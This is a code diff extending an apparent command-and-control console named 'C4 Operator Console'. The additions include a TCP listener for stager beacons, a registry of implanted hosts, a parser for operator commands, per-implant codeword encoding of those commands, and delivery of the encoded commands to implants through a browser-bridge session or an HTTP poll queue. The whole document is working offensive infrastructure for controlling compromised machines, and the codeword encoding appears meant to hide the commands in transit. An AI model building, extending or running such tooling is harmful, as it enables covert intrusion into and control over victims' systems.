@@ -15,7 +15,7 @@ from __future__ import annotations
 import argparse
 import asyncio
 import json
-import random
+import logging
 import shlex
 import sys
 import time
@@ -36,6 +36,10 @@ from encode import (  # noqa: E402
     load_value_codebook,
 )
 
+# Add operator/ dir to path for browser_bridge
+sys.path.insert(0, str(Path(__file__).resolve().parent))
+from browser_bridge import BrowserBridge  # noqa: E402
+
 from aiohttp import web
 from rich.text import Text
 from textual import on, work
@@ -55,6 +59,8 @@ from textual.widgets import (
     RichLog,
     Static,
 )
+
+log = logging.getLogger(__name__)
 
 # ---------------------------------------------------------------------------
 # Tool catalog (loaded from implant_actions.yaml)
@@ -114,6 +120,123 @@ def _load_tools(path: Path = _ACTIONS_PATH) -> list[ToolDef]:
 
 TOOL_CATALOG: list[ToolDef] = _load_tools()
 
+# Map tool name → list of its parameter names (for parsing operator input)
+_TOOL_PARAMS: dict[str, list[str]] = {
+    t.name: [p.name for p in t.params] for t in TOOL_CATALOG
+}
+
+# ---------------------------------------------------------------------------
+# Implant encoder (per-implant codebook lookup)
+# ---------------------------------------------------------------------------
+
+_C4_DIR = Path(__file__).resolve().parent.parent
+_OUT_DIR = _C4_DIR / "out"
+_VALUE_CODEBOOK = _C4_DIR / "value_codebook.yaml"
+
+
+class ImplantEncoder:
+    """Loads and caches the codebook for a specific implant instance."""
+
+    def __init__(
+        self,
+        implant_id: str,
+        tool_to_codes: CodewordMap,
+        param_to_codes: CodewordMap,
+        value_map: ValueMap,
+    ) -> None:
+        self.implant_id = implant_id
+        self.tool_to_codes = tool_to_codes
+        self.param_to_codes = param_to_codes
+        self.value_map = value_map
+
+    def encode(self, action: dict[str, str]) -> str:
+        return encode_action(
+            self.tool_to_codes,
+            self.param_to_codes,
+            action,
+            self.value_map or None,
+        )
+
+
+# Cache: implant_id → ImplantEncoder
+_encoder_cache: dict[str, ImplantEncoder] = {}
+
+
+def get_encoder(implant_id: str) -> ImplantEncoder | None:
+    """Load (or return cached) encoder for the given implant instance."""
+    if implant_id in _encoder_cache:
+        return _encoder_cache[implant_id]
+
+    codebook_path = _OUT_DIR / implant_id / "codebook.yaml"
+    if not codebook_path.exists():
+        return None
+
+    tool_to_codes, param_to_codes = load_codebook(str(codebook_path))
+    value_map = load_value_codebook(str(_VALUE_CODEBOOK))
+
+    enc = ImplantEncoder(implant_id, tool_to_codes, param_to_codes, value_map)
+    _encoder_cache[implant_id] = enc
+    return enc
+
+
+def parse_operator_command(raw: str) -> dict[str, str] | str:
+    """Parse operator input into an action dict for encoding.
+
+    Supports two forms:
+        tool_name arg1 arg2 ...        (positional — mapped to params in order)
+        tool_name param=value ...      (keyword)
+
+    Returns the action dict on success, or an error string on failure.
+    """
+    try:
+        tokens = shlex.split(raw)
+    except ValueError as e:
+        return f"Parse error: {e}"
+
+    if not tokens:
+        return "Empty command"
+
+    tool_name = tokens[0]
+    if tool_name not in _TOOL_PARAMS:
+        return f"Unknown tool: {tool_name}"
+
+    param_names = _TOOL_PARAMS[tool_name]
+    action: dict[str, str] = {"name": tool_name}
+    args = tokens[1:]
+
+    # Detect keyword mode if any arg contains '='
+    if any("=" in a for a in args):
+        for arg in args:
+            if "=" not in arg:
+                return f"Mixed positional/keyword args not supported: {arg}"
+            key, _, val = arg.partition("=")
+            if key not in param_names:
+                return f"Unknown parameter '{key}' for {tool_name}. Valid: {', '.join(param_names)}"
+            action[key] = val
+    else:
+        # Positional mode
+        if len(args) > len(param_names):
+            return (
+                f"{tool_name} takes at most {len(param_names)} arg(s), got {len(args)}. "
+                f"Params: {', '.join(param_names)}"
+            )
+        for i, val in enumerate(args):
+            action[param_names[i]] = val
+
+    # Verify at least one param present (encoder requires it)
+    if len(action) < 2:
+        required = [
+            p.name
+            for t in TOOL_CATALOG
+            if t.name == tool_name
+            for p in t.params
+            if p.required
+        ]
+        return f"{tool_name} requires: {', '.join(required)}"
+
+    return action
+
+
 # ---------------------------------------------------------------------------
 # Data model
 # ---------------------------------------------------------------------------
@@ -131,6 +254,8 @@ class Beacon:
     pid: int
     first_seen: float
     last_seen: float
+    implant_id: str | None = None
+    bridge_url: str | None = None
     alias: str | None = None
     command_queue: list[dict] = field(default_factory=list)
 
@@ -172,6 +297,8 @@ class BeaconRegistry:
             b.ip = data.get("ip", b.ip)
             b.os = data.get("os", b.os)
             b.pid = data.get("pid", b.pid)
+            b.implant_id = data.get("implant_id", b.implant_id)
+            b.bridge_url = data.get("bridge_url", b.bridge_url)
             b.last_seen = now
         else:
             b = Beacon(
@@ -183,6 +310,8 @@ class BeaconRegistry:
                 pid=data.get("pid", 0),
                 first_seen=now,
                 last_seen=now,
+                implant_id=data.get("implant_id"),
+                bridge_url=data.get("bridge_url"),
             )
             self._beacons[bid] = b
         return b
@@ -219,7 +348,7 @@ _app_ref: C4Console | None = None
 async def handle_checkin(request: web.Request) -> web.Response:
     try:
         data = await request.json()
-    except (json.JSONDecodeError, Exception):
+    except (json.JSONDecodeError, ValueError):
         return web.json_response({"error": "bad json"}, status=400)
 
     beacon = registry.checkin(data)
@@ -243,6 +372,68 @@ async def start_http(port: int) -> web.AppRunner:
     site = web.TCPSite(runner, "0.0.0.0", port)
     await site.start()
     return runner
+
+
+# ---------------------------------------------------------------------------
+# TCP listener (raw stager beacons: "BRIDGE <implant_id> <url>")
+# ---------------------------------------------------------------------------
+
+# Browser bridge instance (shared across the app)
+browser_bridge = BrowserBridge(headless=False)
+
+
+async def _handle_tcp_client(
+    reader: asyncio.StreamReader, writer: asyncio.StreamWriter
+) -> None:
+    """Handle a single TCP beacon from the stager."""
+    addr = writer.get_extra_info("peername")
+    try:
+        data = await asyncio.wait_for(reader.read(4096), timeout=10)
+        line = data.decode("utf-8", errors="replace").strip()
+        if not line:
+            return
+
+        parts = line.split(maxsplit=2)
+        msg_type = parts[0] if parts else ""
+
+        if msg_type == "BRIDGE" and len(parts) == 3:
+            implant_id, bridge_url = parts[1], parts[2]
+            # Register as a beacon with the bridge URL
+            beacon = registry.checkin(
+                {
+                    "id": implant_id,
+                    "implant_id": implant_id,
+                    "hostname": f"{addr[0]}" if addr else "unknown",
+                    "ip": addr[0] if addr else "?",
+                    "username": "?",
+                    "os": "?",
+                    "pid": 0,
+                    "bridge_url": bridge_url,
+                }
+            )
+            log.info("BRIDGE beacon: %s → %s", implant_id[:12], bridge_url)
+            if _app_ref is not None:
+                _app_ref.post_message(C4Console.BridgeBeacon(beacon.id, bridge_url))
+
+        elif msg_type == "SESSION" and len(parts) == 3:
+            implant_id = parts[1]
+            log.info("SESSION beacon: %s → %s", implant_id[:12], parts[2])
+            if _app_ref is not None:
+                _app_ref.post_message(C4Console.BeaconCheckin(implant_id))
+
+        else:
+            log.info("Unknown TCP beacon from %s: %s", addr, line[:120])
+
+    except (asyncio.TimeoutError, OSError) as e:
+        log.debug("TCP client error from %s: %s", addr, e)
+    finally:
+        writer.close()
+        await writer.wait_closed()
+
+
+async def start_tcp(port: int) -> asyncio.Server:
+    server = await asyncio.start_server(_handle_tcp_client, "0.0.0.0", port)
+    return server
 
 
 # ---------------------------------------------------------------------------
@@ -282,6 +473,7 @@ class BeaconDetailPanel(Static):
             f"  [bold]IP:[/]       {beacon.ip}",
             f"  [bold]OS:[/]       {beacon.os}",
             f"  [bold]PID:[/]      {beacon.pid}",
+            f"  [bold]Implant:[/]  {beacon.implant_id[:12] if beacon.implant_id else '[red]none[/]'}",
             f"  [bold]Alias:[/]    {beacon.alias or '—'}",
             f"  [bold]Status:[/]   {'[green]alive[/]' if beacon.is_alive else '[red]stale[/]'}",
             f"  [bold]Checkin:[/]  {beacon.last_seen_ago}",
@@ -305,6 +497,14 @@ class C4Console(App):
         def __init__(self, beacon_id: str) -> None:
             super().__init__()
             self.beacon_id = beacon_id
+
+    class BridgeBeacon(Message):
+        """Posted when a BRIDGE beacon arrives with a session URL."""
+
+        def __init__(self, beacon_id: str, bridge_url: str) -> None:
+            super().__init__()
+            self.beacon_id = beacon_id
+            self.bridge_url = bridge_url
 
     TITLE = "C4 Operator Console"
     CSS = """
@@ -383,6 +583,7 @@ class C4Console(App):
     selected_beacon: reactive[Beacon | None] = reactive(None)
     interacting_beacon: reactive[Beacon | None] = reactive(None)
     listen_port: int = 9050
+    tcp_port: int = 9090
 
     def compose(self) -> ComposeResult:
         yield Header()
@@ -405,17 +606,23 @@ class C4Console(App):
         global _app_ref
         _app_ref = self
         self._log("[bold cyan]C4 Operator Console[/] started")
-        self._log(f"Listening on [bold]0.0.0.0:{self.listen_port}[/]")
+        self._log(f"HTTP listener: [bold]0.0.0.0:{self.listen_port}[/]")
+        self._log(f"TCP  listener: [bold]0.0.0.0:{self.tcp_port}[/] (stager beacons)")
         self._log("Waiting for beacons...\n")
         self._log(
             "[dim]Commands: beacons, interact <name>, alias <id> <name>, back, quit, help[/]\n"
         )
-        self._start_listener()
+        self._start_http_listener()
+        self._start_tcp_listener()
         self._start_status_refresh()
 
     @work(exclusive=True, group="http")
-    async def _start_listener(self) -> None:
+    async def _start_http_listener(self) -> None:
         self._runner = await start_http(self.listen_port)
+
+    @work(exclusive=True, group="tcp")
+    async def _start_tcp_listener(self) -> None:
+        self._tcp_server = await start_tcp(self.tcp_port)
 
     @work(exclusive=True, group="status")
     async def _start_status_refresh(self) -> None:
@@ -424,13 +631,26 @@ class C4Console(App):
             await asyncio.sleep(5)
             self.refresh_beacons()
 
-    # -- Beacon checkin notification -------------------------------------
+    # -- Beacon notifications ----------------------------------------------
 
     def on_c4_console_beacon_checkin(self, event: BeaconCheckin) -> None:
         beacon = registry.get(event.beacon_id)
         if beacon:
             self._log(
                 f"[green]✓[/] Beacon check-in: [bold]{beacon.display_name}[/] ({beacon.ip})"
+            )
+        self.refresh_beacons()
+
+    def on_c4_console_bridge_beacon(self, event: BridgeBeacon) -> None:
+        beacon = registry.get(event.beacon_id)
+        if beacon:
+            self._log(
+                f"\n[bold green]⚡ BRIDGE BEACON[/] from [bold]{beacon.display_name}[/]"
+            )
+            self._log(f"  [dim]Implant:[/] {event.beacon_id[:12]}")
+            self._log(f"  [dim]URL:[/]     {event.bridge_url}")
+            self._log(
+                f"  [dim]Use [cyan]interact {beacon.display_name}[/] to open browser session[/]\n"
             )
         self.refresh_beacons()
 
@@ -539,10 +759,28 @@ class C4Console(App):
         self._log(
             f"\n[bold green]Entered session with {beacon.display_name}[/] ({beacon.id[:12]})"
         )
+
+        # Auto-open browser if we have a bridge URL
+        if beacon.bridge_url and beacon.implant_id:
+            self._log("[dim]Opening browser session...[/]")
+            self._open_browser(beacon.implant_id, beacon.bridge_url)
+        elif not beacon.bridge_url:
+            self._log(
+                "[yellow]No bridge URL — commands will be queued (HTTP poll mode)[/]"
+            )
+
         self._log(
             "[dim]Type commands to send. 'back' to return. 'tools' to list available tools.[/]\n"
         )
         self._show_tool_catalog()
+
+    @work(exclusive=False, group="browser")
+    async def _open_browser(self, implant_id: str, bridge_url: str) -> None:
+        try:
+            await browser_bridge.open_session(implant_id, bridge_url)
+            self._log("[green]✓[/] Browser session ready")
+        except Exception as e:
+            self._log(f"[red]Browser open failed:[/] {e}")
 
     def _exit_session(self) -> None:
         if not self.interacting_beacon:
@@ -563,16 +801,74 @@ class C4Console(App):
         beacon = self.interacting_beacon
         if not beacon:
             return
-        cmd_entry = {
-            "id": str(uuid.uuid4())[:8],
-            "command": raw,
-            "queued_at": time.time(),
-        }
-        beacon.command_queue.append(cmd_entry)
+
         self._log(f"[bold]C4[/] ({beacon.display_name}) > {raw}")
-        self._log(
-            f"  [dim]queued → {cmd_entry['id']}  ({len(beacon.command_queue)} pending)[/]"
-        )
+
+        # Parse operator input into action dict
+        result = parse_operator_command(raw)
+        if isinstance(result, str):
+            self._log(f"  [red]{result}[/]")
+            return
+
+        action = result
+
+        # Look up the implant's codebook and encode
+        if not beacon.implant_id:
+            self._log(
+                "  [yellow]WARNING: beacon has no implant_id — sending raw (no encoding)[/]"
+            )
+            encoded = raw
+        else:
+            encoder = get_encoder(beacon.implant_id)
+            if encoder is None:
+                self._log(
+                    f"  [yellow]WARNING: codebook not found for implant {beacon.implant_id[:12]}[/]"
+                )
+                self._log(f"  [dim]expected: out/{beacon.implant_id}/codebook.yaml[/]")
+                self._log("  [yellow]Sending raw (no encoding)[/]")
+                encoded = raw
+            else:
+                try:
+                    encoded = encoder.encode(action)
+                except (ValueError, KeyError) as e:
+                    self._log(f"  [red]Encoding failed: {e}[/]")
+                    return
+
+                self._log(
+                    f"  [dim]encoded →[/] [italic]{encoded[:120]}{'...' if len(encoded) > 120 else ''}[/]"
+                )
+
+        # Deliver via browser bridge if available, otherwise queue for HTTP poll
+        if beacon.implant_id and beacon.implant_id in browser_bridge.active_sessions:
+            self._log("  [dim]sending via browser...[/]")
+            self._send_via_browser(beacon.implant_id, encoded)
+        else:
+            cmd_entry = {
+                "id": str(uuid.uuid4())[:8],
+                "command": encoded,
+                "raw": raw,
+                "action": action,
+                "queued_at": time.time(),
+            }
+            beacon.command_queue.append(cmd_entry)
+            self._log(
+                f"  [dim]queued → {cmd_entry['id']}  ({len(beacon.command_queue)} pending)[/]"
+            )
+
+    @work(exclusive=False, group="browser-cmd")
+    async def _send_via_browser(self, implant_id: str, encoded: str) -> None:
+        try:
+            response = await browser_bridge.send_and_receive(implant_id, encoded)
+            self._log("\n[bold cyan]Response:[/]")
+            # Truncate very long responses for the TUI
+            if len(response) > 2000:
+                self._log(response[:2000])
+                self._log(f"  [dim]... ({len(response)} chars total, truncated)[/]")
+            else:
+                self._log(response)
+            self._log("")
+        except Exception as e:
+            self._log(f"  [red]Browser send failed:[/] {e}")
 
     # -- Alias -----------------------------------------------------------
 
@@ -620,8 +916,8 @@ class C4Console(App):
 
     def _log(self, msg: str) -> None:
         try:
-            log: RichLog = self.query_one("#interaction-log", RichLog)
-            log.write(Text.from_markup(msg))
+            rich_log: RichLog = self.query_one("#interaction-log", RichLog)
+            rich_log.write(Text.from_markup(msg))
         except NoMatches:
             pass
 
@@ -648,12 +944,26 @@ class C4Console(App):
 def main() -> None:
     parser = argparse.ArgumentParser(description="C4 Operator Console")
     parser.add_argument(
-        "--port", type=int, default=9050, help="Listener port (default: 9050)"
+        "--port", type=int, default=9050, help="HTTP listener port (default: 9050)"
+    )
+    parser.add_argument(
+        "--tcp-port",
+        type=int,
+        default=9090,
+        help="TCP listener port for stager beacons (default: 9090)",
+    )
+    parser.add_argument(
+        "--headless",
+        action="store_true",
+        help="Run browser sessions in headless mode",
     )
     args = parser.parse_args()
 
+    browser_bridge.headless = args.headless
+
     app = C4Console()
     app.listen_port = args.port
+    app.tcp_port = args.tcp_port
     app.run()
 
 
